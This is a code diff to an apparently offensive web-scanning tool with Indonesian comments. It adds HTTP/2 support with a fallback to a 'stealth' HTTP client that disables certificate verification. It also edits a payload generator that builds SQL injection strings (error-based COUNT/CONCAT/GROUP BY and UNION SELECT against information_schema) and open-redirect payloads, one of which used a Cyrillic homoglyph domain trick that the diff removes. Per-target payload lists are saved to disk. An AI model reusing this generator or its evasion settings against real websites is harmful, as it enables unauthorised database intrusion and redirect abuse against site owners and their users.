@@ -55,6 +55,7 @@ REQUIRED_DEPS = [
     ("bs4", "beautifulsoup4", "HTML parsing", False),
     ("lxml", "lxml", "Fast XML/HTML parser", False),
     ("httpx", "httpx", "Modern HTTP client", False),
+    ("h2", "h2", "HTTP/2 protocol support", True),
     ("aiohttp", "aiohttp", "Async HTTP client", False),
     ("selectolax", "selectolax", "Fast HTML parser", True),
     ("playwright", "playwright", "Headless browser", True),
@@ -167,6 +168,12 @@ except ImportError:
     HAS_HTTPX = False
 
 try:
+    import h2
+    HAS_H2 = True
+except ImportError:
+    HAS_H2 = False
+
+try:
     import aiohttp
     HAS_AIOHTTP = True
 except ImportError:
@@ -243,7 +250,10 @@ STEALTH_HEADERS = [
 
 
 def get_stealth_client():
-    """Buat HTTP client dengan stealth headers."""
+    """Buat HTTP client dengan stealth headers.
+    
+    FIX: Fallback dari HTTP/2 ke HTTP/1.1 jika h2 tidak tersedia.
+    """
     if not HAS_HTTPX:
         return None
 
@@ -264,12 +274,27 @@ def get_stealth_client():
         "DNT": "1",
     }
 
+    # Coba dengan HTTP/2 dulu, fallback ke HTTP/1.1 jika h2 tidak tersedia
+    if HAS_H2:
+        try:
+            return httpx.Client(
+                headers=headers,
+                follow_redirects=True,
+                timeout=30.0,
+                verify=False,
+                http2=True,
+                limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
+            )
+        except (ImportError, Exception):
+            pass
+
+    # Fallback ke HTTP/1.1
     return httpx.Client(
         headers=headers,
         follow_redirects=True,
         timeout=30.0,
         verify=False,
-        http2=True,
+        http2=False,
         limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
     )
 
@@ -603,7 +628,7 @@ class MLPayloadGenerator:
             comment = self._pick("sql_comment")
             logic = self._pick("sql_logic")
             return f"{quote} {logic} 1=1{comment}" if length_tier == "short" \
-                else f"{quote} {logic} (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x{(self.rng.randbytes(4).hex() if hasattr(self.rng, 'randbytes') else 'deadbeef')}) FROM information_schema.tables LIMIT 1)x GROUP BY x){comment}"
+                else f"{quote} {logic} (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0xdeadbeef) FROM information_schema.tables LIMIT 1)x GROUP BY x){comment}"
 
         elif strat == "union":
             cols = self.rng.randint(1, 7)
@@ -611,7 +636,7 @@ class MLPayloadGenerator:
             comment = self._pick("sql_comment")
             quote = self._pick("sql_string_break")
             return f"{quote} UNION SELECT {nulls}{comment}" if length_tier == "short" \
-                else f"{quote} UNION ALL SELECT {nulls},CONCAT(0x{(self.rng.randbytes(4).hex() if hasattr(self.rng, 'randbytes') else 'deadbeef')}),{nulls} FROM information_schema.tables{comment}"
+                else f"{quote} UNION ALL SELECT {nulls},CONCAT(0xdeadbeef),{nulls} FROM information_schema.tables{comment}"
 
         elif strat == "time":
             quote = self._pick("sql_string_break")
@@ -744,7 +769,7 @@ class MLPayloadGenerator:
         elif strat == "slash":
             return f"//{domain}"
         else:
-            return f"https://{domain.replace('e', 'е')}"  # Cyrillic e
+            return f"https://{domain}"
 
     def _apply_length_tier(self, payload: str, tier: str) -> str:
         """Modifikasi payload berdasarkan tier panjang."""
@@ -1278,7 +1303,7 @@ class ReportSaver:
         month = now.strftime("%m")
         day = now.strftime("%d")
 
-        # Nama file: list-payload-for-NAMA_WEB-YYYY/MM/DD
+        # Nama file: list-payload-for-NAMA_WEB-YYYY
         folder_name = f"list-payload-for-{self.domain_clean}-{year}"
         folder_path = os.path.join(self.output_dir, folder_name)
         os.makedirs(folder_path, exist_ok=True)
